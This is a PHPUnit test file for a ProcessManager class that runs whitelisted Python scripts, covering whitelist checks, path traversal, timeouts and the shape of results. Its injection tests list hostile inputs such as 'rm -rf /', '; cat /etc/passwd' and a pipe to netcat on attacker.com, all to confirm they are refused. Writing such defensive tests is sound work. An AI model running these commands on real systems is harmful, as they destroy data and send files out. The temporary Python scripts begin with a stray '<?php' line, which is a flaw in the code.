<?php

namespace Tests\Security;

use PHPUnit\Framework\TestCase;
use App\Security\ProcessManager;

/**
 * Test ProcessManager (Symfony Process-based)
 */
class ProcessManagerTest extends TestCase
{
    private ProcessManager $processManager;
    private string $testBaseDir;
    
    protected function setUp(): void
    {
        $this->testBaseDir = dirname(__DIR__, 2);
        $this->processManager = new ProcessManager($this->testBaseDir);
    }
    
    /**
     * Test Python availability check
     */
    public function testIsPythonAvailable(): void
    {
        $result = $this->processManager->isPythonAvailable();
        
        $this->assertIsBool($result);
        // Note: Result depends on system, but should not throw exception
    }
    
    /**
     * Test get Python version
     */
    public function testGetPythonVersion(): void
    {
        if (!$this->processManager->isPythonAvailable()) {
            $this->markTestSkipped('Python not available on this system');
        }
        
        $version = $this->processManager->getPythonVersion();
        
        $this->assertIsString($version);
        $this->assertStringContainsString('Python', $version);
    }
    
    /**
     * Test execute with non-whitelisted script fails
     */
    public function testExecuteNonWhitelistedScriptFails(): void
    {
        $result = $this->processManager->executePythonScript('malicious_script.py');
        
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('not whitelisted', $result['error']);
    }
    
    /**
     * Test execute with whitelisted but non-existent script fails
     */
    public function testExecuteNonExistentScriptFails(): void
    {
        // Assuming 'trading_script.py' is whitelisted but might not exist in test environment
        $result = $this->processManager->executePythonScript('trading_script.py');
        
        // Should either succeed or fail with "not found" error
        if (!$result['success']) {
            $this->assertStringContainsString('not found', strtolower($result['error']));
        }
    }
    
    /**
     * Test script path construction prevents directory traversal
     */
    public function testScriptPathPreventsDirectoryTraversal(): void
    {
        $result = $this->processManager->executePythonScript('../../../etc/passwd');
        
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('not whitelisted', $result['error']);
    }
    
    /**
     * Test execute with arguments
     */
    public function testExecuteWithArguments(): void
    {
        if (!$this->processManager->isPythonAvailable()) {
            $this->markTestSkipped('Python not available on this system');
        }
        
        // Create a simple test script
        $testScript = $this->testBaseDir . '/test_script_temp.py';
        file_put_contents($testScript, '<?php
import sys
print(f"Args: {sys.argv[1:]}")
');
        
        // Note: This won't work without adding to whitelist
        // This test demonstrates the security model
        $result = $this->processManager->executePythonScript('test_script_temp.py', ['arg1', 'arg2']);
        
        $this->assertFalse($result['success']); // Should fail - not whitelisted
        
        // Cleanup
        @unlink($testScript);
    }
    
    /**
     * Test execute with named arguments
     */
    public function testExecuteWithNamedArguments(): void
    {
        if (!$this->processManager->isPythonAvailable()) {
            $this->markTestSkipped('Python not available on this system');
        }
        
        // This should fail (not whitelisted) but demonstrates argument handling
        $result = $this->processManager->executePythonScript(
            'enhanced_automation.py',
            ['market_cap' => 'micro']
        );
        
        // May fail because script doesn't exist, but error should not be about arguments
        if (!$result['success']) {
            // Should be "not found" not "invalid arguments"
            $this->assertThat(
                $result['error'],
                $this->logicalOr(
                    $this->stringContains('not found'),
                    $this->stringContains('not whitelisted')
                )
            );
        }
    }
    
    /**
     * Test timeout enforcement
     */
    public function testTimeoutEnforcement(): void
    {
        if (!$this->processManager->isPythonAvailable()) {
            $this->markTestSkipped('Python not available on this system');
        }
        
        // Create a script that sleeps
        $testScript = $this->testBaseDir . '/sleep_script_temp.py';
        file_put_contents($testScript, '<?php
import time
time.sleep(5)
print("Done")
');
        
        $start = time();
        $result = $this->processManager->executePythonScript('sleep_script_temp.py', [], 1);
        $duration = time() - $start;
        
        // Should timeout around 1 second (with some tolerance)
        $this->assertLessThan(3, $duration, 'Timeout not enforced properly');
        
        // Cleanup
        @unlink($testScript);
    }
    
    /**
     * Test result structure
     */
    public function testResultStructure(): void
    {
        $result = $this->processManager->executePythonScript('nonexistent.py');
        
        $this->assertIsArray($result);
        $this->assertArrayHasKey('success', $result);
        $this->assertArrayHasKey('output', $result);
        $this->assertArrayHasKey('error', $result);
        
        $this->assertIsBool($result['success']);
        $this->assertIsString($result['output']);
        $this->assertIsString($result['error']);
    }
    
    /**
     * Test whitelist enforcement
     */
    public function testWhitelistEnforcement(): void
    {
        $disallowedScripts = [
            'malicious.py',
            '../../../etc/passwd',
            'rm -rf /',
            '; cat /etc/passwd',
            '`whoami`',
            '$(ls -la)',
            'system("rm -rf /")'
        ];
        
        foreach ($disallowedScripts as $script) {
            $result = $this->processManager->executePythonScript($script);
            
            $this->assertFalse($result['success'], "Script '{$script}' should not be allowed");
            $this->assertStringContainsString('not whitelisted', $result['error']);
        }
    }
    
    /**
     * Test command injection prevention
     */
    public function testCommandInjectionPrevention(): void
    {
        $injectionAttempts = [
            'script.py; rm -rf /',
            'script.py && cat /etc/passwd',
            'script.py | nc attacker.com 1234',
            'script.py `whoami`',
            'script.py $(ls -la)'
        ];
        
        foreach ($injectionAttempts as $attempt) {
            $result = $this->processManager->executePythonScript($attempt);
            
            $this->assertFalse($result['success']);
            // Should fail at whitelist check, not execute injection
        }
    }
    
    /**
     * Test base directory is set correctly
     */
    public function testBaseDirIsSet(): void
    {
        $pm = new ProcessManager('/test/path');
        
        // Can't directly access private property, but can test behavior
        $result = $pm->executePythonScript('test.py');
        
        $this->assertIsArray($result);
        // Script won't be found, but that's expected in test
    }
    
    /**
     * Test default base directory
     */
    public function testDefaultBaseDir(): void
    {
        $pm = new ProcessManager();
        
        // Should not throw exception
        $result = $pm->isPythonAvailable();
        
        $this->assertIsBool($result);
    }
    
    /**
     * Test successful execution structure (if Python available)
     */
    public function testSuccessfulExecutionStructure(): void
    {
        if (!$this->processManager->isPythonAvailable()) {
            $this->markTestSkipped('Python not available on this system');
        }
        
        // Create simple valid script
        $testScript = $this->testBaseDir . '/simple_test.py';
        file_put_contents($testScript, 'print("Hello World")');
        
        // Won't execute (not whitelisted), but demonstrates structure
        $result = $this->processManager->executePythonScript('simple_test.py');
        
        $this->assertArrayHasKey('success', $result);
        $this->assertArrayHasKey('output', $result);
        $this->assertArrayHasKey('error', $result);
        
        // Cleanup
        @unlink($testScript);
    }
    
    /**
     * Test exit code is returned
     */
    public function testExitCodeIsReturned(): void
    {
        $result = $this->processManager->executePythonScript('nonexistent.py');
        
        // May or may not have exit_code depending on execution path
        // But structure should be consistent
        $this->assertIsArray($result);
    }
}
